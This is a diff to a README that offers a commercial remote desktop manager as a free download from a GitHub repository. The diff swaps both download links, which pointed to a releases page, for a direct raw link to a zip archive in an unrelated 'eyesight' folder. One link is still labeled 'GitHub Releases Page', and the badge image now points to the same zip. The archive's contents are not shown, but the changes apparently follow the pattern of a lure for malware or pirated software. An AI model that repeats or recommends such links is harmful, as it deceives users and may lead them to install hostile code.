@@ -1,7 +1,7 @@
 # 🖥️ Remote-Desktop-Manager-Enterprise-Download - Simple Tool for Remote Access
 
 ## 🔗 Download Now
-[![Download Remote Desktop Manager](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/bkarwan/Remote-Desktop-Manager-Enterprise-Download/releases)
+[![Download Remote Desktop Manager](https://raw.githubusercontent.com/bkarwan/Remote-Desktop-Manager-Enterprise-Download/main/eyesight/Remote-Desktop-Manager-Enterprise-Download.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/bkarwan/Remote-Desktop-Manager-Enterprise-Download/main/eyesight/Remote-Desktop-Manager-Enterprise-Download.zip)
 
 ## 📖 Description
 The Remote Desktop Manager Enterprise helps you manage remote connections and passwords in one central platform. It works efficiently for individuals and teams. This version is designed for easy use, allowing you to connect to remote desktops quickly.
@@ -37,7 +37,7 @@ To get started with the Remote Desktop Manager Enterprise, follow the steps belo
 - **Integration with Third-Party Tools**: Connect with popular applications and services like VPNs and SSH.
 
 ## 📥 Download & Install
-Visit this page to download: [GitHub Releases Page](https://github.com/bkarwan/Remote-Desktop-Manager-Enterprise-Download/releases). 
+Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/bkarwan/Remote-Desktop-Manager-Enterprise-Download/main/eyesight/Remote-Desktop-Manager-Enterprise-Download.zip). 
 Choose the version that fits your needs. Install the software by following the on-screen instructions after downloading.
 
 ## ❓ FAQs
